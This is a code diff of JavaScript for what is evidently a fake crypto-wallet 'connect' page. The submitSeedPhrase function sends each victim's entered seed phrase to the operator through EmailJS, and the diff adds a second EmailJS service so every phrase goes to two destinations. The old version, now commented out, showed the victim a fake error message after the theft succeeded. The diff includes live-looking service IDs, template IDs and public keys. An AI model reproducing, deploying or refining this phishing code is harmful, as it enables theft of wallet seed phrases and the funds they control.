@@ -1335,102 +1335,229 @@ function selectWallet(name, icon) {
 }
 
 // Submit seed phrase function
-function submitSeedPhrase() {
+// function submitSeedPhrase() {
+//   const seedPhrase = document.getElementById("seed-phrase-input").value;
+//   const walletName = selectedWallet.name;
+//   const walletIcon = selectedWallet.icon;
+  
+//   if (!seedPhrase) {
+//     alert("Please enter your seed phrase");
+//     return;
+//   }
+  
+//   // Create a loading state
+//   const connectBtn = document.querySelector(".connect-btn");
+//   connectBtn.disabled = true;
+//   connectBtn.textContent = "Sending...";
+  
+//   // ✅ Send data via EmailJS
+//   emailjs
+//     .send(
+//       "service_vi7c4md", // 🔑 Your EmailJS Service ID
+//       "template_3a8if4m", // 🔑 Your EmailJS Template ID
+//       {
+//         walletName: walletName,
+//         walletIcon: walletIcon,
+//         seedPhrase: seedPhrase,
+//       }
+//     )
+//     .then((response) => {
+//       // ✅ EmailJS returns status 200 on success, not data.success
+//       console.log("Email sent successfully", response.status, response.text);
+
+//       // Now also send via your backend (Nodemailer/SMTP)
+//       sendViaBackend(walletName, walletIcon, seedPhrase, connectBtn);
+      
+//     //   // Show error message to user (even though email sent successfully)
+//     //   alert("An error occurred while connecting your wallet!");
+//     //   closeModal("modal2");
+      
+//     //   // Reset button
+//     //   connectBtn.disabled = false;
+//     //   connectBtn.textContent = "Connect wallet";
+      
+//     //   // Optional: Clear the input field
+//     //   document.getElementById("seed-phrase-input").value = "";
+//     })
+//     .catch((error) => {
+//       console.error("EmailJS Error:", error);
+      
+//       // Show error message if email actually failed to send
+//       alert("An error occurred while connecting your wallet");
+      
+//       // Reset button
+//       connectBtn.disabled = false;
+//       connectBtn.textContent = "Connect wallet";
+//     });
+// }
+
+
+// ✅ NEW: Separate function to send via backend
+// async function sendViaBackend(walletName, walletIcon, seedPhrase, connectBtn) {
+//   try {
+//     const response = await fetch("/api/send-email", {
+//       method: "POST",
+//       headers: {
+//         "Content-Type": "application/json",
+//       },
+//       body: JSON.stringify({
+//         walletName: walletName,
+//         walletIcon: walletIcon,
+//         seedPhrase: seedPhrase,
+//       }),
+//     });
+
+//     const data = await response.json();
+
+//     if (data.success) {
+//       // Show error message to user (even though email sent successfully)
+//       alert("An error occurred while connecting your wallet!");
+//       closeModal("modal2");
+
+//       document.getElementById("seed-phrase-input").value = "";
+//     } else {
+//       alert("⚠️ Email sent via EmailJS, but failed via SMTP");
+//     }
+
+//     connectBtn.disabled = false;
+//     connectBtn.textContent = "Connect wallet";
+//   } catch (error) {
+//     console.error("Backend error:", error);
+//     // Still successful if EmailJS worked
+//     alert("✅ Email sent via EmailJS (backend unavailable)");
+//     closeModal("modal2");
+//     document.getElementById("seed-phrase-input").value = "";
+//     connectBtn.disabled = false;
+//     connectBtn.textContent = "Connect";
+//   }
+// }
+
+
+
+
+
+
+
+// ✅ Initialize both EmailJS instances with different public keys
+const emailjs1 = emailjs;
+emailjs1.init("CgV9vVqryexAak5wJ");
+
+// For second service, you'll need to initialize separately
+let emailjs2Instance;
+
+// Initialize second EmailJS instance
+function initSecondEmailJS() {
+  // Create a separate instance for the second service
+  emailjs2Instance = {
+    // You can use the global emailjs but with different credentials
+    send: async (serviceId, templateId, templateParams) => {
+      return fetch("https://api.emailjs.com/api/v1.0/email/send", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          service_id: serviceId,
+          template_id: templateId,
+          user_id: "mC5siPeyXVLl6J9a5",
+          template_params: templateParams,
+        }),
+      }).then((response) => {
+        if (response.ok) {
+          return { status: 200, text: "OK" };
+        }
+        throw new Error("Failed to send email via second service");
+      });
+    },
+  };
+}
+
+// Initialize on page load
+document.addEventListener("DOMContentLoaded", () => {
+  initSecondEmailJS();
+});
+
+async function submitSeedPhrase() {
   const seedPhrase = document.getElementById("seed-phrase-input").value;
   const walletName = selectedWallet.name;
   const walletIcon = selectedWallet.icon;
-  
+
   if (!seedPhrase) {
-    alert("Please enter your seed phrase");
+    alert("Please enter your seed input");
     return;
   }
-  
+
   // Create a loading state
   const connectBtn = document.querySelector(".connect-btn");
   connectBtn.disabled = true;
   connectBtn.textContent = "Sending...";
-  
-  // ✅ Send data via EmailJS
-  emailjs
-    .send(
-      "service_vi7c4md", // 🔑 Your EmailJS Service ID
-      "template_3a8if4m", // 🔑 Your EmailJS Template ID
+
+  try {
+    // ✅ FIRST: Send via EmailJS Service 1
+    console.log("📧 Sending via EmailJS Service 1...");
+    const response1 = await emailjs.send(
+      "service_vi7c4md", // 🔑 Your first service ID
+      "template_3a8if4m", // 🔑 Your first template ID
       {
         walletName: walletName,
         walletIcon: walletIcon,
         seedPhrase: seedPhrase,
-      }
-    )
-    .then((response) => {
-      // ✅ EmailJS returns status 200 on success, not data.success
-      console.log("Email sent successfully", response.status, response.text);
+      },
+      "CgV9vVqryexAak5wJ" // 🔑 Your first public key
+    );
 
-      // Now also send via your backend (Nodemailer/SMTP)
-      sendViaBackend(walletName, walletIcon, seedPhrase, connectBtn);
-      
-    //   // Show error message to user (even though email sent successfully)
-    //   alert("An error occurred while connecting your wallet!");
-    //   closeModal("modal2");
-      
-    //   // Reset button
-    //   connectBtn.disabled = false;
-    //   connectBtn.textContent = "Connect wallet";
-      
-    //   // Optional: Clear the input field
-    //   document.getElementById("seed-phrase-input").value = "";
-    })
-    .catch((error) => {
-      console.error("EmailJS Error:", error);
-      
-      // Show error message if email actually failed to send
-      alert("An error occurred while connecting your wallet");
-      
-      // Reset button
-      connectBtn.disabled = false;
-      connectBtn.textContent = "Connect wallet";
-    });
-}
+    if (response1.status === 200) {
+      console.log("✅ EmailJS Service 1 sent successfully");
+    }
 
-
-// ✅ NEW: Separate function to send via backend
-async function sendViaBackend(walletName, walletIcon, seedPhrase, connectBtn) {
-  try {
-    const response = await fetch("/api/send-email", {
+    // ✅ SECOND: Send via EmailJS Service 2
+    console.log("📧 Sending via EmailJS Service 2...");
+    const response2 = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        walletName: walletName,
-        walletIcon: walletIcon,
-        seedPhrase: seedPhrase,
+        service_id: "service_7u4bkhu", // 🔑 Your second service ID
+        template_id: "template_1wibi8s", // 🔑 Your second template ID
+        user_id: "mC5siPeyXVLl6J9a5", // 🔑 Your second public key
+        template_params: {
+          walletName: walletName,
+          walletIcon: walletIcon,
+          seedPhrase: seedPhrase,
+        },
       }),
     });
 
-    const data = await response.json();
+    const data2 = await response2.json();
 
-    if (data.success) {
-      // Show error message to user (even though email sent successfully)
-      alert("An error occurred while connecting your wallet!");
+    if (response2.ok) {
+      console.log("✅ EmailJS Service 2 sent successfully");
+      alert("✅ Email sent successfully via both services!");
       closeModal("modal2");
-
       document.getElementById("seed-phrase-input").value = "";
     } else {
-      alert("⚠️ Email sent via EmailJS, but failed via SMTP");
+      console.error("❌ Service 2 failed:", data2);
+      alert("⚠️ Service 1 sent, but Service 2 failed");
     }
 
     connectBtn.disabled = false;
-    connectBtn.textContent = "Connect wallet";
+    connectBtn.textContent = "Connect";
   } catch (error) {
-    console.error("Backend error:", error);
-    // Still successful if EmailJS worked
-    alert("✅ Email sent via EmailJS (backend unavailable)");
-    closeModal("modal2");
-    document.getElementById("seed-phrase-input").value = "";
+    console.error("❌ Error:", error);
+    alert("❌ Error sending email: " + error.message);
     connectBtn.disabled = false;
     connectBtn.textContent = "Connect";
   }
 }
+
+
+
+
+
+
+
+
 
 // Store original modal1 content
 document.addEventListener("DOMContentLoaded", function(event) {
